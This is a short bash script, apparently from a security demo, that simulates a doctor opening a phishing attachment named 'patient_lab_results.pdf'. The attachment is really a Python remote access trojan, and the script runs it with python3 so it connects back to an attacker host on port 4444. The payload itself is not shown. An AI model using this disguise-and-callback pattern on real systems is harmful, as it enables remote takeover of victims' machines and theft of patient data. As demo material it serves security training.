#!/bin/bash
# Simulates a user (doctor) opening a malicious email attachment.
# In the demo, "patient_lab_results.pdf" is actually the Python RAT payload.
set -e
INBOX="/app/inbox"
PAYLOAD="${INBOX}/patient_lab_results.pdf.py"
ATTACKER_HOST="${ATTACKER_HOST:-host.docker.internal}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"

echo "[Demo] Simulating opening email attachment: patient_lab_results.pdf"
echo "[Demo] Connecting to attacker at ${ATTACKER_HOST}:${ATTACKER_PORT}..."
export ATTACKER_HOST ATTACKER_PORT
exec python3 "$PAYLOAD"
